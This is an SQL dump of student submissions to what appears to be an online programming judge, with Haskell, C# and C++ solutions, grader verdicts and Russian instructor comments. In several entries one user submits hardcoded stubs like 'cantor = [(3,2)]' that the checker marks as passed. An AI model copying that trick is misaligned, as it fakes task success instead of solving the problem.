(2015, 64, '397095', '2012-10-14 09:03:28', 1, '   --- OK, очень хорошо, и я бы точно так же написал!\r\ndata Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n-- (а) Простой вариант, сначала обходим левое поддерево, потом правое\r\nfoldTree f z Empty = z\r\nfoldTree f z (Node a left right) = \r\n	let \r\n		l = foldTree f z left\r\n		r = foldTree f l right\r\n	in\r\n		f r a\r\n\r\n-- (б) Более сложный вариант, функция от трёх аргументов: текущий узел, значение в левом поддереве, значение в правом\r\n--     z здесь не значение, где всё агрегируется, а значение для компенсации отсутствия ветки\r\nfoldTree2 f z Empty = z\r\nfoldTree2 f z (Node a left right) = \r\n	let\r\n		l = foldTree2 f z left\r\n		r = foldTree2 f z right\r\n	in\r\n		f a l r\r\n\r\nmain = print (\r\n	let\r\n		t = Node 1 \r\n				(Node 2 Empty Empty) \r\n				(Node 3 Empty \r\n					(Node 4 \r\n						(Node 5 Empty Empty) \r\n						Empty\r\n					)\r\n				)\r\n	in\r\n		[\r\n			foldTree (+) 0 t,\r\n			foldTree (*) 1 t,\r\n			foldTree2 (x l r -> x + l + r) 0 t,\r\n			foldTree2 (x l r -> x * l * r) 1 t,\r\n			foldTree2 (x l r -> max l r + 1) (-1) t\r\n		]\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(2016, 65, '533223', '2012-10-14 09:20:44', 1, 'cantor = cantor1 (1,1)\r\ncantor1 (1,y) = (1,y):cantor1(y+1,1)\r\ncantor1 (x,y) = (x,y):(cantor1 (x-1,y+1))\r\n', '<br/>Тесты успешно пройдены!'),
(2017, 65, '3431532', '2012-10-14 09:26:19', 2, 'cantor = [(x,y) | x <- [1..], y<-[x..]]\r\n  --- Про это, мы, на  самом деле, говорили на занятии, что такой вариант не проходит((\r\n  --- В каком то смысле, действительно получается список всех пар, но только если\r\n  --- попытаетесь найти в  нем, скажем, пару (2,1) то никогда не найдете - до нее в списке\r\n  --- стоит бесконечсное количесво пар вида  (1,i). Те на самом деле есть доп.условие:\r\n  --- надо, чтобы до любой пары можно было дойти за конечное число шагов.  ', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2018, 49, '3742311', '2012-10-14 10:32:12', 1, 'using System;\r\n\r\n\r\n\r\nnamespace Task101\r\n\r\n{\r\n\r\n    internal sealed class BinaryTree\r\n\r\n    {\r\n\r\n        public int Value { get; private set; }\r\n\r\n        \r\n\r\n        public BinaryTree Left { get; private set; }\r\n\r\n        public BinaryTree Rigth { get; private set; }\r\n\r\n\r\n\r\n        public BinaryTree(int value, BinaryTree left, BinaryTree rigth)\r\n\r\n        {\r\n\r\n            Value = value;\r\n\r\n            Left = left;\r\n\r\n            Rigth = rigth;\r\n\r\n        }\r\n\r\n\r\n\r\n        public bool AnyElement(Predicate<int> condition)\r\n\r\n        {\r\n\r\n            return condition(Value) ||\r\n\r\n                   Left != null && Left.AnyElement(condition) ||\r\n\r\n                   Rigth != null && Rigth.AnyElement(condition);\r\n\r\n        } \r\n\r\n    }\r\n\r\n\r\n\r\n    public static class Program\r\n\r\n    {\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            var tree = new BinaryTree(3,\r\n\r\n                new BinaryTree(4,\r\n\r\n                    null,\r\n\r\n                    new BinaryTree(1,\r\n\r\n                        null,\r\n\r\n                        null)),\r\n\r\n                new BinaryTree(2,\r\n\r\n                    null,\r\n\r\n                    null));\r\n\r\n            var any = tree.AnyElement(x => x*x == 1);\r\n\r\n            Console.WriteLine(any);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2019, 61, '82873297', '2012-10-14 10:32:57', 1, 'sumDiv 1 = 0\r\n\r\nsumDiv n = sumDiv1 n 2 1\r\n\r\n\r\n\r\nsumDiv1 n k s | (k*k > n) = s\r\n\r\n              | (k*k == n) = s+k\r\n\r\n              | (mod n k == 0) = sumDiv1 n (k+1) (s+k+(div n k))\r\n\r\n              | otherwise = sumDiv1 n (k+1) s\r\n\r\n\r\n\r\nperfects n = [x|x<-[1..n], sumDiv x == x]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2020, 62, '82873297', '2012-10-14 10:33:38', 1, 'sumDiv 1 = 0\r\n\r\nsumDiv n = sumDiv1 n 2 1\r\n\r\n\r\n\r\nsumDiv1 n k s | (k*k > n) = s\r\n\r\n              | (k*k == n) = s+k\r\n\r\n              | (mod n k == 0) = sumDiv1 n (k+1) (s+k+(div n k))\r\n\r\n              | otherwise = sumDiv1 n (k+1) s\r\n\r\n\r\n\r\namicables n = [(x,y)|x<-[1..(n-1)],y<-[1..n],x<y,(x == sumDiv y),(y == sumDiv x)]\r\n   --- ОК, но, на самом деле, можно очень легко сделать программу гораздо эффективнее \r\n   --- (Тут неэффективность примерно те же, что и в задаче coins) \r\n', '<br/>Тесты успешно пройдены!'),
(2021, 63, '82873297', '2012-10-14 10:33:54', 1, 'fives = scanl (+) 5 (map (x->(10^x)*5)[1..])\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2022, 61, '383483', '2012-10-14 10:34:30', 1, 'perfects n = [i|i<-[2..n], i==(sumDiv i)]\r\n\r\nsumDiv 1 = 1\r\nsumDiv n = foldr (+) 1 (getDivs n)\r\ngetDivs n = [x| x<-[2..(div n 2)], mod n x ==0] ', '<br/>Тесты успешно пройдены!'),
(2023, 65, 'tonyo', '2012-10-14 10:34:44', 1, 'helpl n = [(x,y) | x <- [1..(n-1)], let y = n]\r\n\r\nhelpr n = [(y,x) | x <- [1..n], let y = n]                                                                                   \r\n\r\nnewl n = helpl n ++ [(n,n)] ++ helpr n\r\n\r\ncantor = [x | n <-[1..], x <- newl n]\r\n', '<br/>Тесты успешно пройдены!'),
(2024, 64, '82873297', '2012-10-14 10:36:40', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e  (Node x lt rt)= f (f x (foldTree f  e lt)) (foldTree f  e rt)\r\n\r\nfoldTree (*) 1 (Node 2 (Node 2 Empty Empty) (Node 2 (Node 2 Empty Empty) Empty))\r\nответ: 16.\r\n\r\nfoldTree (+) 0 (Node 1 (Node 1 Empty Empty) (Node 2 (Node 4 Empty Empty) Empty))\r\nответ: 8.', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2025, 62, '383483', '2012-10-14 10:42:42', 1, 'amicables n = [(x,y)| x<-[2..n], y<-[(x+1)..n], x==(sumDiv y), y==(sumDiv x)]\r\n       --- ОК, но, на самом деле, можно очень легко сделать программу гораздо эффективнее \r\n       --- (Тут неэффективность примерно те же, что и в задаче coins) \r\n\r\nsumDiv 1 = 1\r\nsumDiv n = foldr (+) 1 (getDivs n)\r\ngetDivs n = [x| x<-[2..(div n 2)], mod n x ==0] \r\n', '<br/>Тесты успешно пройдены!'),
(2026, 63, '383483', '2012-10-14 10:51:25', 0, 'fives = [take i (repeat 5)| i<-[1..]]', 'Выражение имеет неправильное значение: take 4 fives'),
(2027, 63, '383483', '2012-10-14 11:16:19', 1, 'fives = [(sumNum x 0)| x<-[1..]]\r\nsumNum 0 res = res\r\nsumNum x res = sumNum (x-1) (res + 5*10^(x-1))', '<br/>Тесты успешно пройдены!'),
(2028, 47, '9539826', '2012-10-14 11:25:53', 1, 'powerset [] = [[]]\r\npowerset xs = powerset1 [[]] (head xs) (tail xs)\r\npowerset1 answ elem [] = answ ++ [b++[elem]| b<-answ]\r\npowerset1 answ elem xs = powerset1 (answ ++ [b++[elem]| b<-answ]) (head xs) (tail xs)', '<br/>Тесты успешно пройдены!'),
(2029, 56, '82873297', '2012-10-14 11:59:15', 1, 'allLists _ 0 = [[]]\r\n\r\nallLists n k = [(x:xs) | x<-[1..n], xs <- (allLists n (k-1))]\r\n', '<br/>Тесты успешно пройдены!'),
(2030, 49, '9539826', '2012-10-14 12:01:26', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Linq.Expressions;\r\n\r\nnamespace Tree\r\n{\r\n    class Node\r\n    {\r\n        public Node LNode, RNode;\r\n        int x;\r\n        public bool Any(Func<int,bool> func)\r\n        {\r\n            if (func(x)) return true;\r\n            if (LNode != null) if (LNode.Any(func)) return true;\r\n            if (RNode != null) return RNode.Any(func);\r\n            return false;\r\n        }\r\n        public Node(int arg)\r\n        {\r\n            x = arg;\r\n        }\r\n    }\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            Node Head = new Node(5);\r\n            Head.LNode = new Node(3);\r\n            Head.RNode = new Node(7);\r\n            Head.LNode.LNode = new Node(-1);\r\n            Func<int, bool> f = x => x < 0;\r\n            bool b = Head.Any(f);\r\n            Console.WriteLine(b);\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2031, 65, '12206137', '2012-10-14 13:51:39', 1, 'cantor =\r\n\r\n    cantor'' 2\r\n\r\n    where\r\n\r\n    cantor'' i =\r\n\r\n        [(j,i-j) | j <- [1..i-1]] ++ cantor'' (i+1)\r\n', '<br/>Тесты успешно пройдены!'),
(2032, 66, '12206137', '2012-10-14 13:59:55', 1, 'generalizedCantor n =\r\n\r\n    cantor'' n\r\n\r\n    where\r\n\r\n    cantor'' i =\r\n\r\n        genLists n i ++ cantor'' (i+1)\r\n\r\n        where\r\n\r\n            genLists 1 rem = [[rem]]\r\n\r\n            genLists i rem = [j:tail | j <- [1..rem-i+1], tail <- genLists (i-1) (rem-j)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2033, 62, '44060', '2012-10-14 14:13:29', 1, 'amicables n = [(a,b) | a<-[1..n], b<-[(a+1)..n], b == sumDiv a, a == sumDiv b]\r\n    --- ОК, но можно очень легло сделать гораздо эффективнее, мы это разберем.\r\nsumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]', '<br/>Тесты успешно пройдены!'),
(2034, 65, 'Deutsche', '2012-10-14 14:21:36', 1, 'cantor = lst 1 1 1\r\n-- обход по диагоналям сверху вниз\r\nlst i j n = if (i == n)\r\n		then (i, j):lst 1 (n+1) (n+1)\r\n	    else (i, j):lst (i+1) (j-1) n', '<br/>Тесты успешно пройдены!'),
(2035, 65, '44060', '2012-10-14 14:23:36', 1, 'cantor = n 0 0 1\r\n		where \r\n			  n i 0 1 = (i,0) : (n (i+1) 0 (-1))\r\n			  n 0 j (-1) = (0,j) : (n 0 (j+1) 1)\r\n			  n i j k = if k > 0 then (i,j):(n (i+1) (j-1) k)\r\n								else (i,j):(n (i-1) (j+1) k)', '<br/>Тесты успешно пройдены!'),
(2036, 65, '517309', '2012-10-14 14:34:15', 0, 'cantor = [(3,2),(0,0)]', 'Выражение имеет неправильное значение: length[x|(x,y)<-take 100 cantor, x<=0||y<=0]'),
(2037, 65, '517309', '2012-10-14 14:35:04', 3, 'cantor = [(3,2),(1,1)]', '<br/>Тесты успешно пройдены!'),
(2038, 65, '3431532', '2012-10-14 14:53:48', 1, 'cantor = concat [(cn1 x) ++ (cn2 x) | x <- [1..]]\r\n\r\ncn x = (cn1 x) ++ (cn2 x)\r\n\r\ncn1 x = [(x,y) | y<-[1..x]]\r\ncn2 x = [(y,x) | y<-[1..x-1]]', '<br/>Тесты успешно пройдены!'),
(2039, 65, '517309', '2012-10-14 15:18:36', 0, 'f i = f (i+1)\r\nf 100000 = [(1,1)]\r\n\r\ncantor = f 0\r\n', 'Не удалось вычислить выражение "length(filter(==(3,2))(take 100 cantor))", проверьте правильность синтаксиса'),
(2040, 65, '517309', '2012-10-14 15:19:17', 0, 'cantor = [(3,2)]', '<br/>Тесты успешно пройдены!'),
(2041, 65, '517309', '2012-10-14 15:27:32', 1, 'f 0 = 0\r\nf i = f (i-1) + f(i-1)\r\n\r\ncantor = [(f 25, f 25)]\r\n', 'Не удалось вычислить выражение "length(filter(==(3,2))(take 100 cantor))", проверьте правильность синтаксиса'),
(2042, 62, '517309', '2012-10-14 15:35:44', 0, 'sumDiv n = sum ([i|i<-[1..div n 2], mod n i == 0]\r\n\r\namicable n = [(i,j)| i<-[1..n],j<-[1..n], sumDiv i == j, sumDiv j == i, i < j]  ', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2043, 62, '517309', '2012-10-14 15:38:07', 0, 'sumDiv n = sum [i | i<-[1..div n 2], mod n i == 0 ]\r\n\r\namicables n = [(i, j) | i<-[1..n], j<-[1..n],\r\n   sumDiv i == j, sumDiv j == i, i < j] ', '<br/>Тесты успешно пройдены!'),
(2044, 66, 'Deutsche', '2012-10-14 15:42:04', 2, '  --- Формально у вас правильно, наверное, но очень долго..\r\n  --- У меня take 100 (generalizedCantor 3) считает уже минут 15, наверное - это все таки слишком долго.\r\n  --- Попробуйте придумать более эффективное решение, пожалуйста - это, мне кажется, несложно.\r\n \r\nimport Data.List\r\ngeneralizedCantor n = gCantor n n\r\ngCantor n sumel = [s | s <- nub (subsequences (copy [] [1..(sumel-n+1)] n)), length s == n, sum s == sumel] ++ (gCantor n (sumel+1))\r\ncopy s s1 0 = s\r\ncopy s s1 k = copy (s1 ++ s) s1 (k-1)', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2045, 62, '517309', '2012-10-14 15:45:37', 3, 'f = x -> x*x\r\ng = 	 -> t*t\r\nh a b = a  b\r\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2046, 65, '2562137', '2012-10-14 16:13:55', 1, 'cantor = [(x, sum-x) | sum <- [1..], x <- [1..sum-1]]', '<br/>Тесты успешно пройдены!'),
(2047, 66, '2562137', '2012-10-14 16:16:05', 0, 'generalizedCantor 0 = [[]]\r\ngeneralizedCantor n = [x : xs | x <- [1..], xs <- (generalizedCantor (n-1))]\r\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2048, 57, '2118411', '2012-10-14 16:21:16', 1, 'import Data.List\r\n\r\n\r\n\r\ngetSome xs =  map (x->(map (y->xs!!y) x, xs(map (y->xs!!y) x))) (ys)\r\n\r\n	where \r\n\r\n		ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\r\n		lenxs = (length xs)-1\r\n\r\n		lenys = (length ys)-1\r\n\r\n\r\n\r\ncanMakeScheme [] r\r\n\r\n		| abs (r) <= 1e-10 = True\r\n\r\n		| otherwise =False\r\n\r\n\r\n\r\ncanMakeScheme (xs) r\r\n\r\n		| r < -1e-10 = False\r\n\r\n		| abs r <= 1e-10 = True\r\n\r\n		| (sumR < r) = False\r\n\r\n		| otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs = getSome xs, let len = (length rs)-1, i<-[0..len],let fsxs = fst(rs!!i), curR <- [sum fsxs, foldr (x res -> (x*res)/(x+res)) (head fsxs) (tail fsxs)], let lst=snd (rs!!i), newR<-[r-curR]++(if (r < curR) then [(r*curR)/(curR-r)] else [])]\r\n\r\n		where sumR = sum xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2049, 58, '2118411', '2012-10-14 16:21:47', 2, '  --- У меня считает гораздо дольше, чем 15 мин.((\r\n  --- Вот на таком тесте, например:\r\n  ---  canMakeScheme [13,2,650,3,7,200,200,1350,2000] 1106\r\n\r\nimport Data.List\r\n\r\n\r\n\r\ngetSome xs =  map (x->(map (y->xs!!y) x, xs(map (y->xs!!y) x))) (ys)\r\n\r\n	where \r\n\r\n		ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\r\n		lenxs = (length xs)-1\r\n\r\n		lenys = (length ys)-1\r\n\r\n\r\n\r\ncanMakeScheme [] r\r\n\r\n		| abs (r) <= 1e-10 = True\r\n\r\n		| otherwise =False\r\n\r\n\r\n\r\ncanMakeScheme (xs) r\r\n\r\n		| r < -1e-10 = False\r\n\r\n		| abs r <= 1e-10 = True\r\n\r\n		| (sumR < r) = False\r\n\r\n		| otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs = getSome xs, let len = (length rs)-1, i<-[0..len],let fsxs = fst(rs!!i), curR <- [sum fsxs, foldr (x res -> (x*res)/(x+res)) (head fsxs) (tail fsxs)], let lst=snd (rs!!i), newR<-[r-curR]++(if (r < curR) then [(r*curR)/(curR-r)] else [])]\r\n\r\n		where sumR = sum xs\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2050, 66, '2562137', '2012-10-14 16:40:41', 1, 'myconcat [] ys = ys\r\nmyconcat (x:xs) ys = myconcat xs (x:ys)\r\n\r\ngeneralizedCantor n = foldr (myconcat) [] [f n s | s <- [1..]]\r\n\r\nf 0 sum = \r\n	if sum == 0 then [[]]\r\n	else []\r\nf n sum = \r\n	if n > sum then []\r\n	else [x : xs | x <- [1..sum-(n-1)], xs <- (f (n-1) (sum-x))]', '<br/>Тесты успешно пройдены!'),
(2051, 47, '374969', '2012-10-14 16:49:26', 1, '-- http://users.livejournal.com/_darkus_/40602.html?thread=228506#t228506\r\n   --- ОК, спасибо за ссылку) Но в данном случае не страшно что это есть в сети - задача вообще-то простая,\r\n   --- и мне кажется ее проще решить чем найти в интернете)\r\npowerset [] = [[]]\r\npowerset (x:xs) = s ++ map (x:) s where s = powerset xs', '<br/>Тесты успешно пройдены!'),
(2052, 48, '374969', '2012-10-14 16:53:15', 1, '  --- Но это вы тоже, видимо в интернете нашли, правильно ведь? \r\nmyreverse lst = foldr ( g x -> g (b : x)) id lst []', '<br/>Тесты успешно пройдены!'),
(2053, 50, '51559263', '2012-10-14 16:54:26', 0, '#include <stdio.h>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nstruct tree\r\n{\r\n	tree ( int _val ) : val (_val), left(NULL), right(NULL)\r\n	{}\r\n\r\n	tree ( int _val, tree* l, tree* r ) : val(_val), left(l), right(r)\r\n	{}\r\n\r\n	int  val;\r\n	tree* left;\r\n	tree* right;\r\n};\r\n\r\ntemplate< typename T >\r\nbool Any ( tree* pt )\r\n{\r\n	T f;\r\n	if ( f(pt->val) )\r\n        return true;\r\n\r\n    if ( pt->left != NULL && pt->right == NULL )\r\n        return Any<T>(pt->left);\r\n\r\n    if ( pt->left == NULL && pt->right != NULL )\r\n        return Any<T>(pt->right);\r\n\r\n    if ( pt->left == NULL && pt->right == NULL )\r\n        return false;\r\n\r\n    return ( Any<T>(pt->left) || Any<T>(pt->right) );\r\n}\r\n\r\nvoid main ()\r\n{\r\n	tree* pt = new tree( 77, new tree(99), NULL );\r\n\r\n	auto func = [](int x){return x%3 == 0;};\r\n\r\n	cout << Any<decltype(func)>( pt );\r\n	int c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2054, 50, '51559263', '2012-10-14 16:58:27', 2, '  --- Нет, это не совсем правильно, к сожалению (см замечания ниже)\r\n  --- Попробуйте исправить, пожалуйста, скажем до среды вклюичтельно?\r\n#include < stdio.h >\r\n#include < iostream >\r\n\r\nusing namespace std;\r\n\r\nstruct tree\r\n{\r\n	tree ( int _val ) : val (_val), left(NULL), right(NULL)\r\n            --- Или nullptr вместо NULL (но это конечно не ошибка, просто замечание)\r\n	{}\r\n\r\n	tree ( int _val, tree* l, tree* r ) : val(_val), left(l), right(r)\r\n	{}\r\n\r\n	int  val;\r\n	tree* left;\r\n	tree* right;\r\n};\r\n\r\ntemplate< typename T >\r\nbool Any ( tree* pt )\r\n{\r\n	T f;\r\n	if ( f(pt->val) )\r\n        return true;\r\n\r\n    if ( pt->left != NULL && pt->right == NULL )\r\n        return Any< T >(pt->left);\r\n\r\n    if ( pt->left == NULL && pt->right != NULL )\r\n        return Any< T >(pt->right);\r\n\r\n    if ( pt->left == NULL && pt->right == NULL )\r\n        return false;\r\n\r\n    return ( Any< T >(pt->left) || Any< T >(pt->right) );\r\n}\r\n\r\nvoid main ()\r\n{\r\n	tree* pt = new tree( 77, new tree(99), NULL );\r\n\r\n	auto func = [](int x){return x%3 == 0;};\r\n\r\n	cout << Any< decltype(func) >( pt );\r\n   --- Идея передавать функцию, явно указывая ее тип в шаблоне, мне кажется неудачная..\r\n   --- В Вашем примере получается, но если я скажем напишу обычную функцию\r\n   ---    bool check(int x) {return x%3 == 0;}\r\n   --- и вызову\r\n   ---    Any< decltype(check) >( pt )\r\n   --- то будет ошибка. Да и вообще как-то странно - при вызова не указывать функцию, которую мы передеам,\r\n   --- а указывать только ее тип.\r\n   --- Те я бы советовал передавать функцию в качестве параметра щаблона, т.е. вызывать как-то так:\r\n   ---    Any(pt, func) или Any(pt, check)\r\n   --- На самом деле вашу программу практически и не надо менять, все только проще получается.\r\n   --- Попробуйте так переделать, пожалуйста.\r\n	int c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2055, 62, '97440347', '2012-10-14 17:09:45', 2, 'fives = build_list 0\r\nbuild_list k = k : (build_list (k*10+5))\r\n   --- решение не той задачи..', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2056, 63, '97440347', '2012-10-14 17:10:00', 2, 'fives = build_list 0\r\nbuild_list k = k : (build_list (k*10+5))\r\n   --- У вас список начинается с 0, а не с 5...', 'Выражение имеет неправильное значение: take 4 fives'),
(2057, 61, '787463', '2012-10-14 18:20:01', 1, 'primeDegrees n p = primeDegrees'' n p 0\r\nprimeDegrees'' n p deg\r\n  | n `mod` p^deg == 0 = primeDegrees'' n p (deg + 1)\r\n  | otherwise = reverse [p^d | d <- [0..(deg - 1)]]\r\n\r\nsumDiv n = sumDiv'' n 2 - n\r\nsumDiv'' n p\r\n  | n `mod` p == 0 = \r\n    let\r\n      ps = primeDegrees n p\r\n      sumD = sumDiv'' (n `div` (head ps)) (p + 1)\r\n    in foldr (	 res -> res + t * sumD) 0 ps\r\n  | p < n `div` p = sumDiv'' n (p + 1)\r\n  | n == 1 = 1\r\n  | otherwise = n + 1\r\n\r\nperfects n = [m | m <- [1..n], sumDiv m == m]', '<br/>Тесты успешно пройдены!'),
(2058, 62, '787463', '2012-10-14 18:20:30', 1, 'primeDegrees n p = primeDegrees'' n p 0\r\nprimeDegrees'' n p deg\r\n  | n `mod` p^deg == 0 = primeDegrees'' n p (deg + 1)\r\n  | otherwise = reverse [p^d | d <- [0..(deg - 1)]]\r\n\r\nsumDiv n = sumDiv'' n 2 - n\r\nsumDiv'' n p\r\n  | n `mod` p == 0 = \r\n    let\r\n      ps = primeDegrees n p\r\n      sumD = sumDiv'' (n `div` (head ps)) (p + 1)\r\n    in foldr (	 res -> res + t * sumD) 0 ps\r\n  | p < n `div` p = sumDiv'' n (p + 1)\r\n  | n == 1 = 1\r\n  | otherwise = n + 1\r\n\r\namicables n = [(x, y) | x <- [1..n], let y = sumDiv x, x < y, sumDiv y == x]', '<br/>Тесты успешно пройдены!'),
(2059, 63, '787463', '2012-10-14 18:20:56', 1, 'fives'' n =\r\n  let\r\n    n1 = n * 10 + 5\r\n  in n1 : fives'' n1\r\nfives = fives'' 0', '<br/>Тесты успешно пройдены!'),
(2060, 64, '787463', '2012-10-14 18:21:24', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node i l r) = foldTree f (foldTree f (f i e) l) r\r\n\r\n--foldTree (*) 1 (Node 1 (Node 1 Empty Empty) (Node 3 Empty Empty))\r\n--foldTree (+) 0 (Node 2 (Node 3 Empty Empty) (Node 4 Empty Empty))\r\n\r\nfoldTree'' f e Empty = e\r\nfoldTree'' f e (Node i l r) = f i (foldTree'' f e l) (foldTree'' f e r)\r\n\r\n--foldTree'' (	 l r -> l*t*r) 1 (Node 1 (Node 1 Empty Empty) (Node 3 Empty Empty))\r\n--foldTree'' (	 l r -> l+t+r) 0 (Node 2 (Node 3 Empty Empty) (Node 4 Empty Empty))\r\n--foldTree'' (\\_ l r -> max l r + 1) (-1) (Node 2 (Node 3 Empty Empty) (Node 4 Empty Empty))', '<br/>Тесты успешно пройдены!'),
(2061, 63, '214982', '2012-10-14 18:35:38', 1, 'f = x->10*x + 5\r\n\r\nfives = 5 : (map f fives)', '<br/>Тесты успешно пройдены!'),
(2062, 50, '4837959', '2012-10-14 18:36:07', 1, '#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nstruct Tree {\r\n\r\n    int value;\r\n\r\n    Tree *left, *right;\r\n\r\n    Tree(int value) : value(value), left(NULL), right(NULL) {};\r\n        --- Тут ; в конце можно не писать\r\n\r\n};\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\nbool any(Func f, Tree *root) {\r\n   --- Немного лучше, видимо, const Tree* root \r\n    if (root == NULL) {\r\n\r\n        return false;\r\n\r\n    }\r\n\r\n    return f(root->value) || any(f, root->left) || any(f, root->right);\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n    Tree *root = new Tree(1);\r\n\r\n    root->left = new Tree(3);\r\n\r\n    root->right = new Tree(5);\r\n\r\n    root->right->left = new Tree(7);\r\n\r\n\r\n\r\n    cout << any([] (int v) { return v % 2 == 0; }, root) << endl; // Output: 0\r\n\r\n\r\n\r\n    root->right->right = new Tree(8);\r\n\r\n    cout << any([] (int v) { return v % 2 == 0; }, root) << endl; // Output: 1\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2063, 49, '4837959', '2012-10-14 18:53:56', 1, 'using System;\r\n\r\n\r\n\r\nclass Tree\r\n\r\n{\r\n\r\n    public int val;\r\n\r\n    public Tree left, right;\r\n\r\n\r\n\r\n    public Tree(int val) {\r\n\r\n        this.val = val;\r\n\r\n        left = null;\r\n\r\n        right = null;\r\n\r\n    }\r\n\r\n\r\n\r\n    public bool Any(Func<int, bool> f)\r\n\r\n    {\r\n\r\n        bool res = f(val);\r\n\r\n        res = res || (left != null ? left.Any(f) : false);\r\n\r\n        res = res || (right != null ? right.Any(f) : false);\r\n\r\n        return res;\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nclass Program\r\n\r\n{\r\n\r\n    static void Main(string[] args)\r\n\r\n    {\r\n\r\n        Tree root = new Tree(1);\r\n\r\n        root.left = new Tree(3);\r\n\r\n        root.right = new Tree(5);\r\n\r\n        root.right.left = new Tree(7);\r\n\r\n\r\n\r\n        Console.WriteLine("{0}", root.Any(i => i % 2 == 0)); // Output: False\r\n\r\n\r\n\r\n        root.right.right = new Tree(8);\r\n\r\n        Console.WriteLine("{0}", root.Any(i => i % 2 == 0)); // Output: True\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2064, 65, '787463', '2012-10-14 18:59:27', 1, 'calcDiag n = calcDiag'' n 1\r\ncalcDiag'' n k\r\n  | n <= (k*(k+1)) `div` 2 = k\r\n  | otherwise = calcDiag'' n (k + 1)\r\n\r\ncantor'' n = \r\n  let\r\n    k = calcDiag n\r\n    m = ((k-1)*k) `div` 2\r\n    x = n - m\r\n    y = k - x + 1\r\n  in ((x, y)) : cantor'' (n + 1)\r\ncantor = cantor'' 1', '<br/>Тесты успешно пройдены!'),
(2065, 61, '4837959', '2012-10-14 19:01:14', 1, 'sumDiv n = sum $ filter (x -> mod n x == 0) [1..n - 1]\r\nperfects n = filter (x -> x == sumDiv x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(2066, 47, '442421', '2012-10-14 19:05:48', 1, 'powerset [] = [[]]\r\npowerset x = powerset'' 0 (2^(length x)) (length x) x []\r\n\r\n\r\npowerset'' i m n x r= if i==m then r\r\n		  else powerset'' (i+1) m n x (r ++ [(prod n i x)])\r\n\r\nprod n i x = snd (unzip (filter ((a,b)->a>0) (zip (getBinList n i) x)))\r\n\r\ngetBinList n i = (create0WithL (n-length (getBinList'' i []))) ++ (getBinList'' i [])\r\n\r\ngetBinList'' i r= if i==0 then r else getBinList'' (div i 2) ([mod i 2]++r) \r\n\r\ncreate0WithL l = create l []\r\n\r\ncreate 0 r = r\r\ncreate l r = create (l-1) [0]++r', '<br/>Тесты успешно пройдены!'),
(2067, 48, '442421', '2012-10-14 19:11:42', 1, 'myreverse xs = foldr (a b x -> b (a : x)) same xs []\r\n\r\nsame x = x\r\n', '<br/>Тесты успешно пройдены!'),
(2068, 47, '83813', '2012-10-14 19:13:31', 1, 'powerset [] = [[]]\r\n\r\npowerset (x:xs) = powerset xs ++ [x:res | res <- powerset xs]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2069, 62, '4837959', '2012-10-14 19:37:37', 1, 'sumDiv n = sum $ filter (x -> mod n x == 0) [1..div n 2]\r\namicables n = filter ((x, y) -> x < y && x == sumDiv y) $ map (x -> (x, sumDiv x)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(2070, 63, '4837959', '2012-10-14 19:47:12', 1, 'fives = [read (replicate i ''5'') :: Int | i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2071, 64, '4837959', '2012-10-14 20:01:04', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node v l r) = foldTree f (foldTree f (f e v) l) r\r\n\r\n--foldTree (+) 0 (Node 1 (Node 2 Empty Empty) (Node 3 Empty (Node 4 Empty Empty)))\r\n--10\r\n--\r\n--foldTree (*) 1 (Node 1 (Node 2 Empty Empty) (Node 3 Empty (Node 4 Empty Empty)))\r\n--24\r\n', '<br/>Тесты успешно пройдены!'),
